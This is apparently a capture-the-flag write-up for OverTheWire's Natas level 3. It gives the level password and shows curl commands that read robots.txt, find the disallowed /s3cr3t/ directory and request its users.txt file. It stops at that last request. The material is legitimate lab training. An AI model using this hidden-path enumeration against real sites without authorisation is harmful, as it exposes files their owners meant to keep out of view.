### natas3 pswd: K30JrSRHzjxq3paUQuwozY4MNvmNFyhI

```bash
curl -v -s -X POST http://natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI@natas3.natas.labs.overthewire.org
...
Not even google => `robots.txt` worth to be examined.

```bash
curl -v -s -c cookie.txt -X POST http://natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI@natas3.natas.labs.overthewire.org/robots.txt
# User-agent: *
# Disallow: /s3cr3t/
# * Connection #0 to host natas3.natas.labs.overthewire.org:80 left intact
```

`robots.txt` tells us that we're not allowed to look at directory `/s3cr3t/`. That should be examined!

```bash
curl -v -s -b cookie.txt  http://natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI@natas3.natas.labs.overthewire.org/s3cr3t/
...
Here we discovered a `users.txt` file. Let's check it:

```bash
curl -v -s -b cookie.txt  http://natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI@natas3.natas.labs.overthewire.org/s3cr3t/users.txt
